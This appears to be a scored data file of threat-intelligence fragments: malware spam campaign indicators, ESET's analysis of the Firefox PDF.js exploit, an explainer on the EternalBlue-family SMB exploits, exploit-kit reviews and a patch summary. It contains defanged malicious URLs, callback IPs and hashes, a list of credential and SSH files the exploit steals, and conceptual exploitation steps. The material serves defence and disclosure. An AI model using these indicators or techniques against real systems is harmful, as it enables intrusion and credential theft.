"Excluding the CNN themed emails, the rest contain a link to a malicious IP with the following typical for the campaign, filenames – news.html; boston.html; texas.html; cnn_boston.html.
Sample spamvertised URLs observed in all of the campaigns:
hxxp://190.245.177.248/boston.html
hxxp://78.90.133.133/boston.html
hxxp://176.241.148.169/boston.html
hxxp://95.87.6.156/boston.html
hxxp://46.233.4.113/boston.html
hxxp://213.34.205.27/boston.html
hxxp://37.229.92.116/boston.html
hxxp://95.69.141.121/boston.html
hxxp://110.92.80.47/boston.html
hxxp://62.45.148.76/boston.html
hxxp://118.141.37.122/boston.html
hxxp://94.153.15.249/boston.html
hxxp://178.137.100.12/boston.html
hxxp://24.180.60.184/boston.html
hxxp://110.92.80.47/boston.html
hxxp://46.233.4.113/boston.html
hxxp://85.217.234.98/boston.html
hxxp://213.34.205.27/news.html
hxxp://94.28.49.130/boston.html
hxxp://78.90.133.133/news.html
hxxp://95.87.6.156/news.html
hxxp://176.241.148.169/news.html
hxxp://95.87.6.156/news.html
hxxp://182.235.147.164/news.html
hxxp://sistasplace.org/news.html
hxxp://95.87.6.156/news.html
hxxp://95.87.6.156/news.html
hxxp://94.153.15.249/news.html
hxxp://182.235.147.164/news.html
hxxp://219.198.196.116/news.html
hxxp://94.28.49.130/news.html
hxxp://94.153.15.249/news.html
hxxp://78.90.213.244/news.html
hxxp://85.217.234.98/news.html
hxxp://37.229.215.183/news.html
hxxp://85.217.234.98/news.html
hxxp://83.170.192.154/news.html
hxxp://182.235.147.164/news.html
hxxp://85.217.234.98/news.html
hxxp://china-ptjc.com/cnn_boston.html
hxxp://kuzenergo.ru/cnn_boston.html
hxxp://alltomforsakringar.nu/cnn_boston.html
hxxp://smslanens.se/cnn_boston.html
hxxp://www.smslanens.se/cnn_boston.html
hxxp://numeralarmowy-112.pl/cnn_boston.html
hxxp://ochronaprawkonsumenta.pl/cnn_boston.html
hxxp://www.vdnh.kiev.ua/cnn_boston.html
hxxp://ochronaprawkonsumenta.pl/cnn_boston.html
hxxp://alltomforsakringar.nu/cnn_boston.html
hxxp://higherthanab.com/cnn_boston.html
hxxp://business-link.net/cnn_boston.html
hxxp://www.peaceofchristparish.org/cnn_boston.html
hxxp://ochronaprawkonsumenta.pl/cnn_boston.html
hxxp://smslanens.se/cnn_boston.html
hxxp://mezdustrok.com.ua/cnn_boston.html
hxxp://skinnee.net/cnn_boston.html
hxxp://ochronaprawkonsumenta.pl/cnn_boston.html
hxxp://smslanens.se/cnn_boston.html
hxxp://numeralarmowy-112.pl/cnn_boston.html
hxxp://higherthanab.com/cnn_boston.html
hxxp://host321.ru/cnn_boston.html
hxxp://econ-group.com/cnn_boston.html
hxxp://peaceofchristparish.org/cnn_boston.html
hxxp://vdnh.kiev.ua/cnn_boston.html
hxxp://mannesmann.cz/cnn_boston.html
hxxp://ochronaprawkonsumenta.pl/cnn_boston.html
hxxp://46.40.33.20/texas.html
hxxp://94.28.49.130/texas.html
hxxp://219.198.196.116/texas.html
hxxp://178.150.115.38/texas.html
hxxp://94.153.15.249/texas.html
hxxp://85.198.81.26/texas.html
hxxp://37.229.215.183/texas.html
hxxp://95.87.6.156/texas.html
hxxp://182.235.147.164/texas.html
hxxp://94.153.15.249/texas.html
hxxp://37.229.215.183/texas.html
hxxp://110.92.80.47/texas.html
hxxp://83.170.192.154/texas.html
hxxp://78.90.133.133/texas.html
hxxp://83.170.192.154/texas.html
hxxp://118.141.37.122/texas.html
hxxp://176.241.148.169/texas.html
hxxp://46.40.33.20/texas.html
hxxp://213.34.205.27/texas.html
hxxp://159.148.43.126/texas.html
hxxp://78.90.133.133/texas.html
hxxp://213.231.13.137/texas.html
hxxp://219.198.196.116/texas.html
hxxp://182.235.147.164/texas.html
hxxp://178.137.120.224/texas.html
hxxp://85.217.234.98/texas.html
hxxp://85.217.234.98/texas.html
hxxp://213.34.205.27/texas.html
hxxp://85.217.234.98/texas.html
The first campaign is directly exposing users to the malicious executable (boston.avi_______.exe), with multiple YouTube hosted videos loading in the background of the page.
We’ve observed the following MD5s that were in circulation last week:
MD5: 5ea646ffdc1e9bc7759fdfc926de7660
MD5: 959e2dcad471c86b4fdcf824a6a502dc
MD5: 6ad5c11fb0e0c7c5e1cbc736b4b66676
Once executed, MD5: 5ea646ffdc1e9bc7759fdfc926de7660 phones back to 77.123.40.41:80; 37.229.97.11:80; 190.18.237.20:80; 176.103.0.22:80. Once executed, MD5: 959e2dcad471c86b4fdcf824a6a502dc phones back to hxxp://5.105.102.232/home.htm.
Some of the applets in the RedKit redirecting variation of the campaign contain the following static strings “sdioolg sh ispod“.
Sample RedKit redirectors found on the malicious and spamvertised URLs:
hxxp://bestdoghouseplans.com/azsq.html
hxxp://compfixer.net/ecsr.html
hxxp://chartspmsasia.com/weir.html
hxxp://mcfamiliesinneed.org/czsq.html
hxxp://techpourri.com/hhsr.html
hxxp://pcdesires.com/hoiq.html
hxxp://cedarpointchurch.org/azsr.html
hxxp://kentuckyautoexchange.com/czir.html
Sample redirection chain:
hxxp://212.75.18.190:80/texas.html -> hxxp://www.rkconnect.com:80/cjc.jar – > hxxp://www.rkconnect.com:80/83.html -> hxxp://ewhynwox.ru:80/newbos3.exe -> hxxp://jacobslpc.netne.net:80/n.htm_PSEUDO_RANDOM_CHARACTERS
Java exploit MD5: 590adc78f8965c881efcb0328924f40b – detected by 15 out of 46 antivirus scanners as HEUR:Exploit.Java.CVE-2012-1723.gen
Drops MD5: 502537a985e21eb8ceccd246d1bb4289 – detected by 29 out of 45 antivirus scanners as Backdoor:Win32/Kelihos.F
Second dropped MD5: 86f197e0353a97b630d9b1838520ade1 – detected by 23 out of 46 antivirus scanners as Trojan-PSW.Win32.Tepfer.iojc
Once executed, MD5: 86f197e0353a97b630d9b1838520ade1 phones back to 62.84.60.29:80 and to hxxp://31.128.186.162/login.htm. Once executed, MD5: 502537a985e21eb8ceccd246d1bb4289 phones back to hxxp://159.224.2.196/index.htm and hxxp://109.86.195.130/index.htm.
Now let’s sample the Black Hole Exploit Kit redirecting campaigns using the same theme, and also launched during the events from last week.
Sample redirection chain:
hxxp://alltomforsakringar.nu/cnn_boston.html -> hxxp://thesecondincomee.com/news/agency_row_fixed.php -> hxxp://thesecondincomee.com/news/agency_row_fixed.php?uf=1l:30:1l:1g:1j&ye=1n:1g:2v:1f:1l:32:1h:1f:31:30&t=1f&dh=v&cu=m&jopa=
Java exploit MD5: 26fbf13938b42848a5f4fdb4c0507303 – detected by 8 out of 46 antivirus scanners as HEUR:Exploit.Java.CVE-2012-0507.gen
PDF exploit MD5: 6d254436947947d6ff37dd8f62ec50e6 – detected by 26 out of 46 antivirus scanners as PDF:Exploit.PDF-JS.ZB
Drops MD5: 59ef50a8bca626f0e2b1d86c43e810fc – detected by 1 out of 46 antivirus scanners as Troj/EncProc-K
MD5: f1dd872dbb87d019ecc82bfe7169cb21 – detected by 1 out of 46 antivirus scanners as Troj/EncProc-K
And MD5: c385ad235959c66a4a76eec41aa36fed – detected by 1 out of 46 antivirus scanners as Troj/EncProc-K
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on Twitter.
",0.017247718048744365
"Firefox Under Fire: Anatomy of latest 0‑day attack
The recent Firefox attacks are an example of active in-the-wild exploitation of a serious software vulnerability.",0.01311832559090309
Anton Cherepanov,0.012177145254436028
11 Aug 2015 - 12:00PM,0.01120676238974394
The recent Firefox attacks are an example of active in-the-wild exploitation of a serious software vulnerability.,0.013283647270209142
"On the August 6th, the Mozilla Foundation released a security update for the Firefox web browser that fixes the CVE-2015-4495 vulnerability in Firefox’s embedded PDF viewer, PDF.js. This vulnerability allows attackers to bypass the same-origin policy and execute JavaScript remotely that will be interpreted in the local file context. This, in turn, allows attackers to read and write files on local machine as well as upload them to a remote server. The exploit for this vulnerability is being actively used in the wild, so Firefox users are advised to update to the latest version (39.0.3 at the time of writing) immediately.",0.008435969217979955
"In this blog we provide an analysis of two versions of the script and share details about the associated attacks against Windows, Linux and OS X systems.",0.011901762023490248
"According to ESET’s LiveGrid® telemetry, the server at the IP address 185.86.77.48, which was hosting the malicious script, has been up since July 27, 2015. Also we can find corroboration on one of the compromised forums:",0.012022563649866869
Image 1: Forum user is curious about malicious script injected into the page,0.008137254219165446
"Operatives from the Department on Combating Cybercrime of the Ministry of Internal Affairs of Ukraine, who responded promptly to our notification, have also confirmed that the malicious exfiltration server, hosted in Ukraine, has been online since July 27, 2015.",0.013913321274363066
"According to our monitoring of the threat, the server became inactive on August 8, 2015.",0.010574926987254596
The script,0.0070444316115675365
"The script used is not obfuscated and easy to analyze. Nevertheless, the code shows that the attackers had good knowledge of Firefox internals.",0.013487166294336328
"The malicious script creates an IFRAME with an empty PDF blob. When Firefox is about to open the PDF blob with the internal PDF viewer (PDF.js), new code is injected into the IFRAME (Figure 2). When this code executes, a new sandboxContext property is created within wrappedJSObject. A JavaScript function is written to the sandboxContext property. This function will later be invoked by subsequent code. Together, these steps lead to the successful bypass of the same-origin policy.",0.015194580492634335
Image 2: Code that creates sandboxContext property,0.008324460365894737
"The exploit is very reliable and works smoothly. However, it may display a warning which can catch the attention of tech-savvy users.",0.011755953391097695
Image 3: The warning message showed on compromised site,0.008956027595347194
"After successful exploitation of the bug, execution passes to the exfiltration part of code. The script supports both the Linux and Windows platforms. On Windows it searches for configuration files belonging to popular FTP clients (such as FileZilla, SmartFTP and others), SVN client, instant messaging clients (Psi+ and Pidgin), and the Amazon S3 client.",0.00826572927214797
Image 4: The list of collected files on Windows at the first stage of attack,0.008615779334369633
These configuration files may contain saved login and password details.,0.014012503727957037
"On the Linux systems, the script sends following files to the remote server:",0.007475670624841557
"/etc/passwd
/etc/hosts
/etc/hostname
/etc/issue",0.010430728454700056
"It also parses the /etc/passwd file in the order to get the home directories (homedir) of users on the system. The script then searches files by mask in the home directories collected, and it avoids searching in the home directories of standard system users (such as daemon, bin, sys, sync and so forth).",0.015078308298558829
Image 5: The list of collected files on Linux at stage 1 of attack,0.009054689846075825
It collects and uploads such files as:,0.007990104109500185
"history (bash, MySQL, PostgreSQL)
SSH related configuration files and authorization keys
Configuration files for remote access software – Remmina
FileZilla configuration files
PSI+ configuration
text files with possible credentials and shell scripts",0.013382591001451671
"As is evident here, the purpose of the first version of the malicious script was to gather data used mostly by webmasters and site administrators. This allowed attackers to move on to compromising more websites.",0.009885837953699017
The second version,0.006580593954444325
The day after Mozilla released the patch for Firefox the attackers decided to go “all-in”: they registered two new domains and improved their script.,0.015134663535842252
The two new malicious domains were maxcdnn[.]com (93.115.38.136) and acintcdn[.]net (185.86.77.48). The second IP address is the same one as used in the first version. Attackers selected these names because the domains look as if they belong to a content delivery network (CDN).,0.017487902843752012
"The improved script on the Windows platform not only collects configuration files for applications; it also collects text files containing almost all combinations of words of possible value to attackers (such as password, accounts, bitcoins, credit cards, exploits, certificates, and so on):",0.008768290078087326
Image 6: List of files collected on Windows during the second attack stage,0.008492065030188178
The attackers improved the Linux script by adding new files to collect and also developed code that works on the Mac OS X operating system:,0.007916865139244278
Image 7: List of files collected on Macs during the second stage of an attack,0.008090162508292087
"Some Russian-speaking commentators misattributed this code to the Duqu malware, because some variables in the code have the text “dq” in them.",0.01356182951521867
A copycat attack,0.008452280299170889
"Since the bug is easy to exploit and a working copy of the script is available to cybercriminals, different attackers have started to use it. We have seen that various groups quickly adopted the exploit and started to serve it, mostly on adult sites from google-user-cache[.]com (108.61.205.41)",0.014398018731910933
"This malicious script does all the same things as the original script, but it collects different files:",0.008797588564850689
Image 8: The list of collected files used in copycat attack,0.007946458612382412
Conclusion,0.008171308922719556
"The recent Firefox attacks are an example of active in-the-wild exploitation of a serious software vulnerability. The exploit shows that the malware-writers had a deep knowledge of Firefox internals. It is also an interesting one, since in most cases, exploits are used as an infection vector for other data-stealing trojans. In this instance, however, that was not necessary, because the malicious script alone was able to steal sensitive files from victims’ systems.",0.00930854078474419
"Additionally, the exploit started to be reused by other malware operators shortly after its discovery. This is common practice in the malware world.",0.009293035890872825
ESET detects the malicious scripts as JS/Exploit.CVE-2015-4495. We also urge Firefox users to update their browser to the patched version (39.0.3). The internal Firefox PDF reader can also be disabled by changing the pdfjs.disabled setting to true.,0.016493778673327686
Indicators of Compromise,0.0076996116119932845
A partial list of compromised servers:,0.00795299054408094
"hxxp://www.akipress.org/
hxxp://www.tazabek.kg/
hxxp://www.super.kg/
hxxp://www.rusmmg.ru/
hxxp://forum.cs-cart.com/
hxxp://www.searchengines.ru/
hxxp://forum.nag.ru/",0.013965520462531966
Servers used in attack:,0.006264753364110698
"maxcdnn[.]com (93.115.38.136)
acintcdn[.]net (185.86.77.48)
google-user-cache[.]com (108.61.205.41)",0.017678430230257836
Hashes (SHA1):,0.010576925175246
"0A19CC67A471A352D76ACDA6327BC179547A7A25
2B1A220D523E46335823E7274093B5D44F262049
19BA06ADF175E2798F17A57FD38A855C83AAE03B
3EC8733AB8EAAEBD01E5379936F7181BCE4886B3
",0.015561089492295732
"How threat actors are using SMB vulnerabilities
Some of the most devastating ransomware and Trojan malware variants depend on vulnerabilities in the Windows Server Message Block (SMB) to propagate through an organization’s network. Windows SMB is a protocol used by PCs for file and printer sharing, as well as for access to remote services.
A patch was released by Microsoft for SMB vulnerabilities in March 2017, but many organizations and home users have still not applied it. So now, the unpatched systems allow threats that take advantage of these vulnerabilities inside, helping active malware campaigns spread like Californian wildfire.
SMB vulnerabilities have been so successful for threat actors that they’ve been used in some of the most visible ransomware outbreaks and sophisticated Trojan attacks of the last two years. In fact, our product telemetry has recorded 5,315 detections of Emotet and 6,222 of TrickBot in business networks—two Trojan variants that are using the SMB vulnerabilities—in the last 30 days alone.
What makes them so effective?
What makes some malware so widespread is the way in which it propagates. While massive spam campaigns only render a few victims that actually pay off, a worm-like infection that keeps spreading itself requires little effort for multiplying returns. And that’s exactly what the SMB vulnerabilities allow their payloads to do: spread laterally through connected systems.
For example, WannaCry ransomware (also known as WannaCrypt), which used one of the SMB vulnerabilities, was launched in May 2017, yet the infection continues to expand. Below is the graph that shows our telemetry for Ransom.WannaCrypt for the month of November 2018.",0.01273683047363472
"It’s been more than 1.5 years, and WannaCry continues to proliferate, thanks to the sheer number of unpatched machines connected to infected networks.
How did this come about?
At the moment, there are three exploits in the wild that use SMB vulnerabilities. These exploits have been dubbed EternalBlue (used by WannaCry and Emotet), EternalRomance (NotPetya, Bad Rabbit, and TrickBot), and EternalChampion. There is a fourth exploit called EternalSynergy, but we have only seen a Proof of Concept (PoC)—nothing has appeared yet in the wild.
All these exploits were leaked by the ShadowBrokers Group, who allegedly stole them from the NSA. Less then a month after ShadowBrokers published their “findings,” the first fully functional malware that used the EternalBlue exploit, WannaCry, was found in the wild.
Since then, multiple large-scale malware attacks have relied on the SMB vulnerabilities to penetrate organizations’ networks, including the NotPetya and Bad Rabbit ransomware campaigns in 2017, and now the Emotet and TrickBot Trojan attacks, which have been ongoing through the third and fourth quarter of 2018.
Let’s now take a closer, more technical look at each exploit and how they work.
EternalBlue
A bug in the process of converting File Extended Attributes (FEA) from OS2 structure to NT structure by the Windows SMB implementation can lead to a buffer overflow in the non-paged kernel pool. This non-paged pool consists of virtual memory addresses that are guaranteed to reside in physical memory for as long as the corresponding kernel objects are allocated.
A buffer overflow is a programming flaw that lets the data written to a reserved memory area (the buffer) go outside of bounds (overflow), allowing it to write data to adjacent memory locations. This means attackers are able to control the content of certain memory locations that they should not be able to access, which attackers then exploit to their advantage. In the case of EternalBlue, they are able to control the content of a heap that has execution permission, which leads to the Remote Code Execution (RCE) vulnerability, or the ability to execute commands on a target machine over the network.
EternalRomance
Eternal Romance is an RCE attack that exploits CVE-2017-0145 against the legacy SMBv1 file-sharing protocol. Please note that file sharing over SMB is normally used only on local networks, and the SMB ports are typically blocked from the Internet by a firewall. However, if an attacker has access to a vulnerable endpoint running SMB, the ability to run arbitrary code in kernel context from a remote location is a serious compromise.
At the core of this exploit is a type confusion vulnerability. Type confusion vulnerabilities are programming flaws that happen when a piece of code doesn’t verify the type of object that is passed to it before using it. Type confusion can allow an attacker to feed function pointers or data into the wrong piece of code. In some cases, this can lead to code execution.
In other cases, type confusion vulnerability leads to an arbitrary heap write, or heap spray. Heap spraying is a method typically used in exploits that places large amounts of code in a memory location that the attacker expects to be read. Usually, these bits of code point to the start of the actual code that the exploit wants to run in order to compromise the system that is under attack.
After the spray has finished, the exploit uses an info leak in a TRANS_PEEK_NMPIPE transaction. It uses the info leak to determine whether the target is running a 32- or 64-bit version of Windows and to get kernel pointers for various SMB objects.
EternalChampion
The issue exploited by EternalChampion is a race condition in how SMBv1 handles transactions. A race condition, or race hazard, is the behavior of a system where the output depends on the sequence or timing of other uncontrollable events. It becomes a bug when events do not happen in the order the programmer intended. Sometimes these bugs can be exploited when the outcome is predictable and works to the attackers’ advantage.
Meanwhile, a transaction is a type of request that can potentially span multiple packets. For example, if a request is too large to fit in a single server message block (SMB), a transaction of the appropriate size can be created, and this will store the data as it is received from multiple SMBs.
This vulnerability is exploited in two ways: first for an information leak, and second for remote code execution. The bug is first exploited to leak pool information via an out-of-bounds read. To do this, a single packet containing multiple SMBs is sent to the server. This packet contains three relevant pieces:",0.02338284996614315
"A primary transaction request that will immediately be executed.
A secondary transaction request that triggers the bug caused by the race condition.
Sets of primary transactions that heap spray the pool with the intention to place a transaction structure immediately behind the one that tracks the first primary transaction request.",0.014495380934428592
"First, a transaction is created that contains the shellcode. This does not start the exploit, it just contains the second stage payload. Next, a packet is sent that contains multiple SMBs. The packet contains all expected transaction data and immediately begins execution.
The secondary transaction handler copies the secondary transaction request’s data if it fits in the buffer. Except due to the race condition, the pointer now points to the stack of the primary transaction request handlers’ thread (as opposed to the expected pool buffer). This allows an attacker to write their data directly to the stack of another thread.
The attacker has control over the displacement, so they can choose the amount of data to copy and then copy it. This allows them to precisely overwrite a return address stored on the stack of the primary transaction request handler’s thread, and results in the ability for Remote Code Execution.
EternalSynergy
The Proof of Concept for EternalSynergy shows that incoming SMB messages are copied by an initial handler into the corresponding transaction buffer. But the handler automatically assumes that the provided address is the beginning of the buffer. However, during a write transaction, the same address is automatically assumed to be the end of the existing data, and the address pointing to the beginning of the buffer is updated accordingly.
This means that an attacker can construct a secondary message in the transaction to point beyond the start of the buffer, resulting in a buffer overflow during the copy action.
EternalRocks
Looking for information about these SMB exploits, you may also run into an exploit called EternalRocks. EternalRocks was not included in the ShadowBrokers release, but was instead constructed and discovered later. EternalRocks uses seven NSA tools where, for example, WannaCry only used two (EternalBlue and another called DoublePulsar).
Prevention and remediation
Despite the significant power SMB vulnerabilities afford to attackers, there is one simple remedy to prevent them from ever becoming problematic.
Patch your systems.
The Windows Operating Systems vulnerable to the attacks found in the wild all predate Windows 10. Most attacks work only on Windows 7 and earlier, and Microsoft released patches for the vulnerabilities that were leaked under the Microsoft Security Bulletin MS17-010. This leaves little-to-no reason for networks to be vulnerable to these attacks, yet the number of current victims is overwhelming.
By applying the patch released by Microsoft in 2017, all your eternal headaches can magically disappear. And for extra measure, we also recommend you patch and update all systems, browsers, and software as soon as possible to shore up any other potential vulnerabilities in the network.
In addition, many cybersecurity solutions, including Malwarebytes Endpoint Protection, offer innovative anti-exploit technology that can block threats such as EternalBlue from ever dropping their payloads and infecting systems.
For example, Malwarebytes’ anti-exploit module detected WannaCry as Ransom.WannaCrypt right from the start. Below, we created a heat map using our telemetry, showing where the infection started and how fast it spread across the globe.",0.018984154856664825
"It is for good reason that most cybersecurity guides advise users to patch quickly and keep systems updated. So many of the infections seen today could be avoided with consistent monitoring and basic computer maintenance. Unfortunately, a lot of businesses believe they do not have the time or manpower to follow this advice. But when companies leave their networks unprotected, they compromise the integrity of all of our online experiences—especially when SMB vulnerabilities allow infections to spread so quickly.
Don’t be one of those companies. Get protected and stay updated!
",0.013916730137131461
"Malvertising Campaign via Pop-under Ads Sends CryptoWall 4
We have caught a new malvertising campaign on the PopAds network launching the Magnitude exploit kit via pop-under ads.
A pop-under is an ad window that appears behind the main browser window and typically remains open until the user manually closes it. Unsuspecting victims running outdated versions of the Flash Player were immediately infected with the CryptoWall ransomware.
This campaign started around January 1st with ads mostly placed on various adult and video streaming sites and lead to an increase in Magnitude EK activity.
Infection flow overview",0.02260121876462684
"serve.popads.net/servePopunder.php?cid={redacted}
{redacted}.name/
Magnitude EK domain",0.011167080058185341
Magnitude EK overview,0.008041418912298814
Landing page,0.008976301740969528
Flash exploit (CVE-2015-7645),0.011303920277989432
"MD5 (Original): bc0939c7cb7d85b6789fbd6a160a4470
MD5 (Decompiled): b91d14a85576f9c0d2864f802f8a039b",0.012926856100385131
"According to our data, this attack mainly targeted European users:",0.012357978819608872
"CryptoWall 4 infection
Once a system is infected, personal files are encrypted and usable as indicated in the dreaded CryptoWall ransom page:",0.011986107350225206
"To recover pictures, documents and other import files, users are asked to pay in order to receive a “decryption” key.",0.01249527724314059
"Malware MD5: c0f8d8d2bf9a70cc69d641ed0263f77e
Prevention
Ransomware is one particular type of malware where prevention and backups are more important than ever. Since this particular attack relies on web exploits to infect the machine, it is crucial to keep your browser and related plugins up to date.
You may also want to consider disabling or removing the Flash Player altogether since it has suffered a high number of zero-day exploits in recent history (even the latest version was vulnerable).
Malwarebytes Anti-Exploit users were already protected against this exploit kit and never even saw the CryptoWall payload.",0.014442993022391049
"We have notified the ad network and hope they can shutdown this campaign.
",0.01750613644127519
Security Updates for Adobe Reader and Acrobat,0.01296977856623549
"Posted by Roger on 16 November 2010, 2:21 pm",0.01273732761337043
"Adobe has released the security updates previously announced for Adobe Reader and Adobe Acrobat.
The bulletin reports that CVE-2010-4091, which can lead to code execution, remains vulnerable.   Adobe plans to patch that in the next Reader 8.x update in February.   Not very friendly to those still running Reader 8.
",0.015362765238620457
"Exploit kits: fall 2018 review
Exploit kit (EK) activity continues to surprise us as the weather cools, the leaves change, and we move into the fall of 2018. Indeed, shortly after our summer review, a new exploit kit was discovered, and while no new vulnerabilities were added to the current EKs, several malvertising chains are still going strong.
Smoke Loader, Ramnit, and AZORult are some of the most common payloads we’ve observed in the last few months—particularly in Japan and Canada. The geo-targeted exploit kits such as Magnitude EK continue to predominantly affect South Korea and Taiwan.
Another interesting trend as of late is a decrease in cryptomining payloads and an increase in ransomware drops instead, mostly via the Fallout and RIG EKs.
Fall 2018 EK overview",0.016958921549190764
"Fallout EK
RIG EK
GrandSoft EK
Magnitude EK
Underminer EK",0.012611820156385178
"Internet Explorer’s CVE-2018-8174 and Flash’s CVE-2018-4878 continue to be the most relied upon vulnerabilities.
Fallout EK
Fallout EK, discovered by team nao_sec, is the newest exploit kit which takes its name and URI patterns from the defunct Nuclear EK. Fallout EK has diverse campaigns that are not limited to a particular geographic location and therefore could be seen as a direct rival to RIG EK. Due to its constantly changing and complex URI paths, Fallout EK stands out from its counterparts.",0.013978236827524193
"The payload in this sequence is GandCrab ransomware.
229BD13628C1AE3E84A9C7860617B836ACCDE4D932D2A2DC9DB64E78C211DA41
RIG EK
Not much has changed with RIG EK in recent times, but since the arrival of its new competitor, Fallout EK, our telemetry shows its usage has slowly declined in the past quarter.",0.014017182536301798
"The payload in this sequence is Kraken ransomware.
2F5DEC0A8E1DA5F23B818D48EFB0B9B7065023D67C617A78CD8B14808A79C0DC
GrandSoft EK
GrandSoft EK is a little less common than the other EKs that we track. Some of its delivery chains include compromised websites acting as an intermediary gate. Thanks to team nao_sec for sharing some recent traffic.",0.012305076155149752
"The payload in this sequence is the Ramnit banker.
6FDA89FBB9FD66EE929665E376077E07C1BD2AF2D91C63148A7F5E818E4D27B2
Magnitude EK
Magnitude EK continues to faithfully deliver its own brand of ransomware to targeted countries, such as South Korea. and Taiwan. It is one of the rare exploit kits that uses a truly fileless payload, which makes its extraction to disk a challenge.",0.012229524914879608
"The payload in this sequence is Magniber ransomware (extracted with @hasherezade‘s hollows_hunter).
F229AE5F68C72E678D4D706CE84ABFCCC983A299E39BEBCD990AECE7E3F97D71
Underminer EK
We spotted Underminer EK a few times during the past quarter. This exploit kit is unique because its payload delivery, a bootkit, is vastly different from any other EK.",0.01332184485519694
"The payload in this sequence is a bootkit infector.
Mitigation
As always, it is important to keep systems up-to-date and reduce the attack surface whenever possible. The current vulnerabilities used by the above exploit kits have already been patched by their respective vendors.
Malwarebytes’ application hardening protection layer blocks these EKs before they even get a chance to drop their payloads.",0.012580387969252538
"Extended shelf life
The recent addition of Fallout EK has given exploit kits yet another extension on their otherwise limited shelf life by tapping into existing and new malvertising campaigns with a wider geographic focus.
As 2019 comes closer, Internet Explorer is still offering opportunities for newer exploits yet to be weaponized, but we could see other browsers such as Edge gain some attention as well.
",0.01224606217265034
PRODUCTS & SERVICES,0.010734820384793453
"16 critical vulnerabilities, some being exploited, fixed in July, 2019 Windows updates",0.008027888118944948
Russian hackers allegedly have been exploiting two vulnerabilities in the course of attacks,0.006635380803655999
"Written by
SophosLabs Offensive Security",0.008622298185940958
"July 09, 2019",0.008479977773543701
Products & Services SophosLabs Uncut CVE CVE-2019-0880 CVE-2019-1132 Patch Tuesday updates Windows,0.008314015012258036
"Microsoft released their monthly security updates for July today. This month’s fixes address 77 vulnerabilities that affect Windows and a range of software that runs on Windows, mainly Internet Explorer, DirectX and the graphical subsystem.
Adobe products did not synchronize the release of patches for their products this month.
Among the vulnerabilities, 16 are categorized by Microsoft as critical, 60 as important and 1 as moderate.
Almost all of the critical vulnerabilities allow an attacker to execute remote code on the targeted system and 19 of the important vulnerabilities can be used for local elevation of privilege. Through a successful social engineering attack, either with a malicious website or Excel documents, an external attacker could fully compromise a targeted user’s machine.
There are 6 critical vulnerabilities for Internet Explorer and 5 for Chakra, the JavaScript engine of both Edge and Internet Explorer. The following components all have one remote code execution vulnerability: the Windows DHCP server, the Azure DevOps Server, the .NET Framework and the GDI+ API. Finally there is an authentication bypass for applications using the Windows Communication Foundation and the Windows Identity Foundation API.
There are reports that the two elevation of privilege vulnerabilities affecting Windows components are actively being exploited.
It’s worth reminding readers that the availability of patches does not mean that your computer has installed them, yet. To find and download this month’s Cumulative Update patch yourself, search for the term “2019-07” at the Microsoft Update Catalog website.
Let’s have a closer look at some of the interesting vulnerabilities.",0.013649884225043651
"Win32k Elevation of Privilege Vulnerability 🕷️
CVE-2019-1132
The Win32k driver on Windows 7 32bit can be abused to get a NULL pointer dereference. An attacker with remote code execution could use this vulnerability to achieve local elevation of privilege. This has been exploited in the wild.
Microsoft splwow64 Elevation of Privilege Vulnerability 🕷️
CVE-2019-0880
There is pointer dereference issue in the printer driver for 32-bit processes that could be used to escape the sandbox of Internet Explorer Enhanced Protected Mode (EPM).
After achieving remote code execution using a vulnerability like the ones that follow, affecting the Edge or Internet Explorer web browsers, an attacker could exploit this vulnerability to create a new process of medium integrity level. This has been exploited in the wild.
Multiple browser memory corruption vulnerabilities
Internet Explorer: CVE-2019-1001, -1004, -1056, -1059, -1063, and -1104
Chakra: CVE-2019-1062, -1092, -1103, -1106, and -1107
Internet Explorer and Edge suffer from several memory corruption vulnerabilities, such as type confusion, out-of-bounds write, and use-after-free.
If an attacker could trick a victim into browsing to a malicious website, they can execute remote code in the context of the web browser. To gain full control of the machine is more difficult: the attacker would need to escape the sandbox using a vulnerability such as the previously mentioned CVE-2019-0880, and then perform a local privilege elevation that delivers full administrative access.
Sophos coverage
Sophos has released following detection to address the vulnerabilities mentioned above.   Please note that additional vulnerabilities and corresponding detection may be released in the future.",0.009619160208720667
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2019-0880
Exp/20190880-A
N/V
N/V",0.010681633750006525
"CVE-2019-1129
Exp/20191129-A
N/V
N/V",0.011322470506660465
"CVE-2019-1132
Exp/20191132-A
N/V
N/V",0.011237426529027927
"N/V = Not Validated.
The PoC code provided with MAPP advisories does not include active exploits and as such is not applicable to Intercept X testing. Intercept X’s ability to block the exploit depends on the actual exploit weaponization approach, which we won’t see until someone spots it in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks
How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. Please note that some detection might not be available due to the availability of the data.
It is mostly not possible to test with Intercept-X due to the nature of the data we receive.
What if the vulnerability/0-day you look for is not covered above?
The most likely reason for this is we did not receive enough information about the vulnerability to create detection.",0.010353721024912055
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"VB2014 paper: Evolution of Android exploits from a static analysis tools perspective
2016-01-01",0.009691162532160624
"Anna Szalay
Sophos
,
UK",0.00813287610609914
"Jagadeesh Chandraiah
Sophos
,
UK
Editor:
Martijn",0.010121516705474454
"Grooten
Abstract
With Android being the fastest-growing mobile OS, and with a rapidly increasing number of Android malware samples in existence, it is important to acknowledge the risk of exploitation of security vulnerabilities by malware. In their VB2014 paper, Anna Szalay and Jagadeesh Chandraiah investigate Android malware that has attempted to exploit vulnerabilities, and identify the most relevant threat families from the perspective of static analysis tools. They also provide an evaluation of the various analysis tools that are currently available, exploring their successes and failures, and identifying the best approach for future analysis.
Copyright © 2014 Virus Bulletin",0.010456063471509514
"Abstract
With Android being the fastest-growing mobile OS, and with a rapidly increasing number of Android malware samples, it is important to acknowledge the risk of exploitation of security vulnerabilities by malware.
According to Common Vulnerabilities and Exposures (CVE) data, over the past few years the total number of documented Android vulnerabilities has reached 36, with seven of them discovered in the last year. The most serious of the recent ones is the so-called ‘Master Key’ vulnerability (CVE-2013-4787), which is reported to have affected 99% of devices, compromising the APK signature validation process.
With the total number of Android samples in our database exceeding 900,000, and 2,000 new Android malware samples appearing every day, we estimate that approximately 10% of the samples exploit some vulnerability, of which one tenth will be a ‘Master Key’ exploit.
